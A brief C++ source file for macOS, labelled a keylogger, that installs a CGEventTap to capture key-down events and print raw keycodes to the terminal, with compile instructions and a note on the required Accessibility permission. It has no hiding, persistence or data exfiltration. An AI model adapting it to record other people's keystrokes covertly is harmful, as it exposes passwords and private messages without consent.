// ============================================================
// keylogger.cpp — logs keystrokes via CGEventTap
// ------------------------------------------------------------
// Compile: clang++ -O2 -o keylogger keylogger.cpp -framework ApplicationServices
// Run:    ./keylogger
// Note:   Requires Accessibility permission (System Settings >
//          Privacy & Security > Accessibility). Without it,
//          the tap callback never fires.
// ============================================================
#include <ApplicationServices/ApplicationServices.h>
#include <cstdio>

CGEventRef callback(CGEventTapProxy, CGEventType type, CGEventRef event, void*) {
    if (type == kCGEventKeyDown) {
        CGKeyCode keycode = (CGKeyCode)CGEventGetIntegerValueField(
            event, kCGKeyboardEventKeycode);
        printf("keycode: %u\n", keycode);
        fflush(stdout);
    }
    return event;
}

int main() {
    CGEventMask mask = CGEventMaskBit(kCGEventKeyDown);
    CFMachPortRef tap = CGEventTapCreate(
        kCGSessionEventTap, kCGHeadInsertEventTap,
        kCGEventTapOptionDefault, mask, callback, nullptr);

    if (!tap) {
        fprintf(stderr, "CGEventTapCreate failed — grant Accessibility access.\n");
        return 1;
    }

    CFRunLoopSourceRef src = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, tap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), src, kCFRunLoopCommonModes);
    CGEventTapEnable(tap, true);
    CFRunLoopRun();
    return 0;
}
